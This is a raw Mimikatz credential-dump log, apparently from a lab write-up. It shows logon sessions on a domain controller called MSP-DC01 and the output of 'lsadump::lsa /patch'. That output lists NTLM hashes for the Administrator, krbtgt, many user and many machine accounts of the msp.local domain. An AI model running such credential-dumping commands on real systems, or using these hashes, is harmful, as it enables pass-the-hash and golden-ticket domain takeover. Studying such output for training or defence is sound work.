         * DPAPI    : 7263d9855727c0aac27b599b031a0f89
        tspkg :
        wdigest :
         * Username : MSP-DC01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-DC01$
         * Domain   : msp.local
         * Password : 79 1d a4 e8 fc f7 48 c1 1b 3f fd fc e1 17 a0 56 86 95 00 5c 60 3e a2 4b 03 26 23 75 16 e5 bf 9c 44 38 2c 93 48 d8 d1 20 c1 ea eb bc 84 cb 71 57 f2 c6 d2 c8 5d e3 18 9b 50 a4 d5 ed c7 04 fe 3b 5d 5b 26 59 0b 50 22 5d 80 e7 45 cc ef 89 0e 8f 1c 4b 69 20 16 2d 7a 37 b8 d1 be b3 eb 3c 3d ed e2 3f a7 de a0 96 f2 aa 0a d5 86 0a 70 41 ef 57 e4 35 de 3b 37 fb 6c c9 2f ba 0f fa 5c d5 82 a9 09 d2 4b 31 fb ff df 1c 18 d8 96 98 c9 b4 a1 cb f1 71 b6 88 23 e0 12 14 f8 eb 68 98 9f e3 68 46 0e 83 92 eb 5e 75 99 1e 7a 27 24 fa 10 01 ca bd 15 ac a0 38 ab 8f 2f 39 1d 75 19 70 ee 21 2c ca 82 99 4f 84 67 91 fb 0c 9b de c3 7b 1a a3 30 20 13 ca 6f 42 03 ff 50 e8 63 b6 db 84 7f 8f fc 0c fa 41 d8 a2 07 39 b8 3b 62 90 9e 6f c8 f9 c2 63
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:48:53 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 49535 (00000000:0000c17f)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:48:53 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MSP-DC01$
         * Domain   : MSP
         * NTLM     : a35ce596e7f4a7af3cf2e50e13760977
         * SHA1     : 7263d9855727c0aac27b599b031a0f898b834ff1
         * DPAPI    : 7263d9855727c0aac27b599b031a0f89
        tspkg :
        wdigest :
         * Username : MSP-DC01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-DC01$
         * Domain   : msp.local
         * Password : 79 1d a4 e8 fc f7 48 c1 1b 3f fd fc e1 17 a0 56 86 95 00 5c 60 3e a2 4b 03 26 23 75 16 e5 bf 9c 44 38 2c 93 48 d8 d1 20 c1 ea eb bc 84 cb 71 57 f2 c6 d2 c8 5d e3 18 9b 50 a4 d5 ed c7 04 fe 3b 5d 5b 26 59 0b 50 22 5d 80 e7 45 cc ef 89 0e 8f 1c 4b 69 20 16 2d 7a 37 b8 d1 be b3 eb 3c 3d ed e2 3f a7 de a0 96 f2 aa 0a d5 86 0a 70 41 ef 57 e4 35 de 3b 37 fb 6c c9 2f ba 0f fa 5c d5 82 a9 09 d2 4b 31 fb ff df 1c 18 d8 96 98 c9 b4 a1 cb f1 71 b6 88 23 e0 12 14 f8 eb 68 98 9f e3 68 46 0e 83 92 eb 5e 75 99 1e 7a 27 24 fa 10 01 ca bd 15 ac a0 38 ab 8f 2f 39 1d 75 19 70 ee 21 2c ca 82 99 4f 84 67 91 fb 0c 9b de c3 7b 1a a3 30 20 13 ca 6f 42 03 ff 50 e8 63 b6 db 84 7f 8f fc 0c fa 41 d8 a2 07 39 b8 3b 62 90 9e 6f c8 f9 c2 63
        ssp :
        credman :

Authentication Id : 0 ; 31513 (00000000:00007b19)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:48:53 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : MSP-DC01$
         * Domain   : MSP
         * NTLM     : a35ce596e7f4a7af3cf2e50e13760977
         * SHA1     : 7263d9855727c0aac27b599b031a0f898b834ff1
         * DPAPI    : 7263d9855727c0aac27b599b031a0f89
        tspkg :
        wdigest :
         * Username : MSP-DC01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-DC01$
         * Domain   : msp.local
         * Password : 79 1d a4 e8 fc f7 48 c1 1b 3f fd fc e1 17 a0 56 86 95 00 5c 60 3e a2 4b 03 26 23 75 16 e5 bf 9c 44 38 2c 93 48 d8 d1 20 c1 ea eb bc 84 cb 71 57 f2 c6 d2 c8 5d e3 18 9b 50 a4 d5 ed c7 04 fe 3b 5d 5b 26 59 0b 50 22 5d 80 e7 45 cc ef 89 0e 8f 1c 4b 69 20 16 2d 7a 37 b8 d1 be b3 eb 3c 3d ed e2 3f a7 de a0 96 f2 aa 0a d5 86 0a 70 41 ef 57 e4 35 de 3b 37 fb 6c c9 2f ba 0f fa 5c d5 82 a9 09 d2 4b 31 fb ff df 1c 18 d8 96 98 c9 b4 a1 cb f1 71 b6 88 23 e0 12 14 f8 eb 68 98 9f e3 68 46 0e 83 92 eb 5e 75 99 1e 7a 27 24 fa 10 01 ca bd 15 ac a0 38 ab 8f 2f 39 1d 75 19 70 ee 21 2c ca 82 99 4f 84 67 91 fb 0c 9b de c3 7b 1a a3 30 20 13 ca 6f 42 03 ff 50 e8 63 b6 db 84 7f 8f fc 0c fa 41 d8 a2 07 39 b8 3b 62 90 9e 6f c8 f9 c2 63
        ssp :
        credman :

mimikatz(commandline) # lsadump::lsa /patch
Domain : MSP / S-1-5-21-2998733414-582960673-4099777928

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 5ab419bf7ce8fc7c9dcc3c5f2fcf5714

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : aae39b0f0f043e3a7eefc88a13560c80

RID  : 00000453 (1107)
User : mspdb
LM   :
NTLM : 90b1b0e51da0ba63796d66a38c1b67d3

RID  : 000006ae (1710)
User : Woming
LM   :
NTLM : 916646dc2d7d98992a03df5e51c17624

RID  : 000006af (1711)
User : Andrescrove
LM   :
NTLM : 9e38efab41522f5da3e4bb084daf37c7

RID  : 000006b0 (1712)
User : Onnithashe
LM   :
NTLM : 198bd631bc8d36e24246a0c7cd0ce71d

RID  : 000006b1 (1713)
User : Whirosed
LM   :
NTLM : e93632382754680fc7f89c1d1beef4e9

RID  : 000006b2 (1714)
User : Addren
LM   :
NTLM : deb3114e53ff50a3c78d4d2d257bb545

RID  : 000006b3 (1715)
User : Preselle
LM   :
NTLM : 2b315feeb5450b37c425d56e9dbc89ab

RID  : 000006b4 (1716)
User : Turninaing
LM   :
NTLM : 31f5bb7ef56c58782256bd9cac535ee8

RID  : 000006b5 (1717)
User : Fesed1979
LM   :
NTLM : e4e983e16e63cbda3bd7e985eea3fab0

RID  : 000006b6 (1718)
User : Parectedepas
LM   :
NTLM : af1fce4ab1c140d4242158c80c205679

RID  : 000006b7 (1719)
User : Mutect88
LM   :
NTLM : 5a319d2f7f1f6e677fb8361c3885252b

RID  : 000006b8 (1720)
User : Taboure79
LM   :
NTLM : 83bb6a8f77d0f48a16bcd4ab5b900c5e

RID  : 000006b9 (1721)
User : Forgest
LM   :
NTLM : b31e2e26fe067523a422495f6b0880ae

RID  : 000006ba (1722)
User : Tandon
LM   :
NTLM : 2ee413962f6de87eeece41deb67c5855

RID  : 000006bb (1723)
User : Havistries1995
LM   :
NTLM : 6182855207f5d3d89bc0a80cb44ec4f8

RID  : 000006bc (1724)
User : Prother
LM   :
NTLM : 092348a5dac6dbd7de50891c66f5493e

RID  : 000006bd (1725)
User : Chad1975
LM   :
NTLM : ab32151f9837fbea6f140eba0746bcb3

RID  : 000006be (1726)
User : Gloold
LM   :
NTLM : 9b7b9fea5f77ae051ed597ded69d6e80

RID  : 000006bf (1727)
User : Thref1977
LM   :
NTLM : a3161a3ce3afdf36755ceb3400fc8b07

RID  : 000006c0 (1728)
User : Thionus
LM   :
NTLM : 460a73394164534b09d88096079a575b

RID  : 000006c1 (1729)
User : Hont1987
LM   :
NTLM : dd5eac49fbcb7bf1bd4000d4a3b9ce93

RID  : 000006c2 (1730)
User : Babsizarly
LM   :
NTLM : 9435dfe5eadb55b1e9917be1cc2c369d

RID  : 000006c3 (1731)
User : Anifing1990
LM   :
NTLM : 2bf767b110ac6a2369361e46fe33dadf

RID  : 000006c4 (1732)
User : Vencome
LM   :
NTLM : 2ab2e65bbeb6e37ddc26dc7f3129a9e4

RID  : 000006c5 (1733)
User : Parin1988
LM   :
NTLM : 3ea27e39ec3f72350aee9cffe62c2f92

RID  : 000006c6 (1734)
User : Hereinitoor
LM   :
NTLM : a14ab16fad207f5bb25ae8e5b145401d

RID  : 000006c7 (1735)
User : Sagoonger
LM   :
NTLM : 78d545f1e3cc8acc77b3c1646d65c4f9

RID  : 000006c8 (1736)
User : Whoas1978
LM   :
NTLM : ec10d6799b65711a2c0cef6b396cf89b

RID  : 000006c9 (1737)
User : Rust1988
LM   :
NTLM : 26f656881f0df2fcb06c9f0a703db8bb

RID  : 000006ca (1738)
User : Winested1989
LM   :
NTLM : 3aa1eb4d33dffae29d64d48c8aaa3d55

RID  : 000006cb (1739)
User : Adlyinit
LM   :
NTLM : c08e2153f5a5008c04ecca3bad6e6bba

RID  : 000006cc (1740)
User : Thicate
LM   :
NTLM : fa3d39b37dd4c31ba010662415133a84

RID  : 000006cd (1741)
User : Thiclon1990
LM   :
NTLM : acde1b4482174363cd5824712ab0b11e

RID  : 000006ce (1742)
User : Augh1997
LM   :
NTLM : 77cfabee51f0b484f5ece274e46072f6

RID  : 000006cf (1743)
User : Abone1982
LM   :
NTLM : 8ebb1c8cd9db3f0aa06cfb720c00cf0a

RID  : 000006d0 (1744)
User : Vory1997
LM   :
NTLM : d42d22701f1f67b410c115f5abc284a0

RID  : 000006d1 (1745)
User : Dinacker
LM   :
NTLM : 25033353180ce121e9414902c0bd392d

RID  : 000006d2 (1746)
User : Mich1990
LM   :
NTLM : a090b89b6c5e8b44012f8ee35d30cb94

RID  : 000006d3 (1747)
User : Thismillond97
LM   :
NTLM : 3a0dd4e6c3a5f1dfaf36236f4cf0147c

RID  : 000006d4 (1748)
User : Serot1984
LM   :
NTLM : a9474ea2c241107f1e06bcefba57d9e0

RID  : 000006d5 (1749)
User : Samelver
LM   :
NTLM : 6fa5b78ac9bf52feb4ddaa09f909c1ae

RID  : 000006d6 (1750)
User : Wareir
LM   :
NTLM : 9a33b4bc57cedca87d5aa7cfb2c77414

RID  : 000006d7 (1751)
User : Shavessined1998
LM   :
NTLM : 63a86c521b40eafbe967f1e57147acba

RID  : 000006d8 (1752)
User : Againe1988
LM   :
NTLM : e45878f31815eac4905d1c408e0c2e80

RID  : 000006d9 (1753)
User : Thatoonse
LM   :
NTLM : 8cbe1e606d1f508ed59d0a9ea1cf90ab

RID  : 000006da (1754)
User : Ancessiond
LM   :
NTLM : c9a26f3353d8417ab40207f6979295ca

RID  : 000006db (1755)
User : Thaventinsom
LM   :
NTLM : 896546a08f284ebaec08e1700c973178

RID  : 000006dc (1756)
User : Whatrold
LM   :
NTLM : f8bab5a297bdb8c092ab1f5c2198593c

RID  : 000006dd (1757)
User : Knellf85
LM   :
NTLM : b3779736c8cde2ff286dd30a362a44c5

RID  : 000006de (1758)
User : Oicieffive
LM   :
NTLM : 128b4013a01d45be9b391fd9d53b6a1a

RID  : 000006df (1759)
User : Incion1979
LM   :
NTLM : 2e508c025d97a807240e47445768f723

RID  : 000006e0 (1760)
User : Fliatich
LM   :
NTLM : a4be66c49e593f055a3b497b45b19db6

RID  : 000006e1 (1761)
User : Fretty
LM   :
NTLM : 5be0e19a672d1cf63b64bfd665c9c2f2

RID  : 000006e2 (1762)
User : Houst1996
LM   :
NTLM : 5e42a949d3f5c023f12163696136029e

RID  : 000006e3 (1763)
User : Witheat
LM   :
NTLM : 8af4a662266396de1e31499a337828c4

RID  : 000006e4 (1764)
User : Alting83
LM   :
NTLM : 53dcd24769601350fe988791088387ec

RID  : 000006e5 (1765)
User : Wastiong
LM   :
NTLM : 5ec0e864d93efecd0a41c06112120245

RID  : 000006e6 (1766)
User : Dision
LM   :
NTLM : 09522b06e1f7cb13db2e4b7c8212324d

RID  : 000006e7 (1767)
User : Firastr
LM   :
NTLM : 93af4aedabbb0327a5a10909c1b01baa

RID  : 000006e8 (1768)
User : Ourepts
LM   :
NTLM : 0d36bfd6334c94d4c4636fe97017f16d

RID  : 000006e9 (1769)
User : Vole1993
LM   :
NTLM : 64258ff934d9e4eb3fcebaaae94c716f

RID  : 000006ea (1770)
User : Thaposts
LM   :
NTLM : b20c01108673d93c22c41aa6c41b85e3

RID  : 000006eb (1771)
User : Soming
LM   :
NTLM : 0a0c0defe15f83e2e655dff410309694

RID  : 000006ec (1772)
User : Tromis
LM   :
NTLM : a48baa6368f237a0536a2735e7483bd5

RID  : 000006ed (1773)
User : Lodir1975
LM   :
NTLM : c2d127472d5f2f9e5a9d17e7a2bf61cd

RID  : 000006ee (1774)
User : Shmeack
LM   :
NTLM : 623c230d203108419b67655930fec14a

RID  : 000006ef (1775)
User : Layse1986
LM   :
NTLM : 34217f07c797ae952d619d98f16f0051

RID  : 000006f0 (1776)
User : Musigen
LM   :
NTLM : 15cee3f310821955bde1bd2eac6eb543

RID  : 000006f1 (1777)
User : Fiefeeng
LM   :
NTLM : af6c914719b9a3bfdc475c4a84341407

RID  : 000006f2 (1778)
User : Armorthavins
LM   :
NTLM : e32c9738a78cdb039fbb9f4a495bf174

RID  : 000006f3 (1779)
User : Trubmisoace
LM   :
NTLM : b13e4c6d4e958b74302120106f635ba9

RID  : 000006f4 (1780)
User : Nould1991
LM   :
NTLM : 95e85045c708ac36e9ff9c0b03cf9ffc

RID  : 000006f5 (1781)
User : Wourethe1986
LM   :
NTLM : c79ebf63e9855bd3a9cc49aae9b437e2

RID  : 000006f6 (1782)
User : Proccomped
LM   :
NTLM : 46ddb175f8c46ce87917b81c9cc5e17e

RID  : 000006f7 (1783)
User : Wasion1989
LM   :
NTLM : 26763fdce50b963bca291b1b04862d06

RID  : 000006f8 (1784)
User : Guld1974
LM   :
NTLM : f3d09a0d1c3814d4154d418a9a46f115

RID  : 000006f9 (1785)
User : Woun1975
LM   :
NTLM : 140cf24c02e8b3f50d251a3698b313f9

RID  : 000006fa (1786)
User : Alownd
LM   :
NTLM : 78b3147b7b928c5e5d49e2125f32b06b

RID  : 000006fb (1787)
User : Depud1976
LM   :
NTLM : 40cb6dc93b2484a17c0ac4eb898deb8c

RID  : 000006fc (1788)
User : Efolotervis
LM   :
NTLM : c2d48e3e3377ada069294eb7d5a62322

RID  : 000006fd (1789)
User : Repar1981
LM   :
NTLM : b34cfd85447642a24a6be0ea03899a19

RID  : 000006fe (1790)
User : Gerry1977
LM   :
NTLM : 774172cbc32282d1d449b7d6a35d1d61

RID  : 000006ff (1791)
User : Jimed1984
LM   :
NTLM : e9b646ee601df3dae4f854688b51b496

RID  : 00000700 (1792)
User : Fighou
LM   :
NTLM : 5b1961203ee8701dec5982b49fc58bc8

RID  : 00000701 (1793)
User : Priked
LM   :
NTLM : a41486040db645d23437105c8995e7f8

RID  : 00000702 (1794)
User : Ruital79
LM   :
NTLM : 81d094ae56e151fadff083b3f9a7c7cb

RID  : 00000703 (1795)
User : Alayeaker
LM   :
NTLM : ef5e3399ba824aeaf0fb62c2c71e7b22

RID  : 00000704 (1796)
User : Wercusittoon78
LM   :
NTLM : 271ca30d761bea25c152470176c2a2ee

RID  : 00000705 (1797)
User : Enambriat
LM   :
NTLM : 139cfcc1cca7430812e1dfacbdddba00

RID  : 00000706 (1798)
User : Sters1973
LM   :
NTLM : 03338027965aba4efbb357c4476e79bf

RID  : 00000707 (1799)
User : Pliked
LM   :
NTLM : 62613a3b9be7bb36026730206d1feaa2

RID  : 00000708 (1800)
User : Prinaces
LM   :
NTLM : b77a345c9149a26663eb494bb3dd1b0c

RID  : 00000709 (1801)
User : Thentry
LM   :
NTLM : 13362c3ce8f947a656be19487bef813c

RID  : 0000070a (1802)
User : Fortal
LM   :
NTLM : 50708d7838ef33896685ac407ac4802c

RID  : 0000070b (1803)
User : Hareplity
LM   :
NTLM : b8736d2d8b54fc7f24d8d313597e2d14

RID  : 0000070c (1804)
User : Wassitte
LM   :
NTLM : 37b0d8a2f33bd62e2d4930f8f3e7bc77

RID  : 0000070d (1805)
User : Expaletioll
LM   :
NTLM : 1e83aa9fb2516810d6e6651e14809b5c

RID  : 0000070e (1806)
User : Hathand
LM   :
NTLM : c941b303a30481044eedb969801292de

RID  : 0000070f (1807)
User : Fromp1991
LM   :
NTLM : 8b4a91cc5d38ce6e9288997c891f815a

RID  : 00000710 (1808)
User : Sommestake1982
LM   :
NTLM : 271ab3d61470c9aa12920db929d2aff1

RID  : 000003e8 (1000)
User : MSP-DC01$
LM   :
NTLM : a35ce596e7f4a7af3cf2e50e13760977

RID  : 00000450 (1104)
User : MSP-SQLREPORT$
LM   :
NTLM : 021a4640a3f12d115ac4db759708fd4c

RID  : 00000451 (1105)
User : MSP-SRV01$
LM   :
NTLM : 51cadf87076f5d9e8938f675ccf08518

RID  : 0000071c (1820)
User : msp-report08$
LM   :
NTLM : d8b644fcb9447e1f9c798b5e90e86f35

RID  : 0000071d (1821)
User : msp-san07$
LM   :
NTLM : 928ae2b283e3c7cf77817de69d1b6643

RID  : 0000071e (1822)
User : msp-srv08$
LM   :
NTLM : 8ff838c9ef30af8fa387983c7e863849

RID  : 0000071f (1823)
User : msp-srv04$
LM   :
NTLM : e7a4e96436e832bce9003e2a4da2f42f

RID  : 00000720 (1824)
User : msp-data09$
LM   :
NTLM : 07b0b4b0734f6d1a355f3e3186b5661d

RID  : 00000721 (1825)
User : msp-web06$
LM   :
NTLM : fc1a0f9ddc2a2a8bee3de29ba017c66a

RID  : 00000722 (1826)
User : msp-dc07$
LM   :
NTLM : 191156aa60828260fe45703375d7aea8

RID  : 00000723 (1827)
User : msp-data04$
LM   :
NTLM : bc398ed8673734e5ab777a0fd2e0789c

RID  : 00000724 (1828)
User : msp-report05$
LM   :
NTLM : c8d2b60eb03bf5ee62aef3185ae35f96

RID  : 00000725 (1829)
User : msp-dc08$
LM   :
NTLM : f813048c2c7bf0b2093dab37960c5175

RID  : 0000044f (1103)
User : INTERNALMSP$
LM   :
NTLM : 8b418ab120e3183fcced241d337e86df

mimikatz(commandline) # exit
Bye!
```


[back](./section2.html)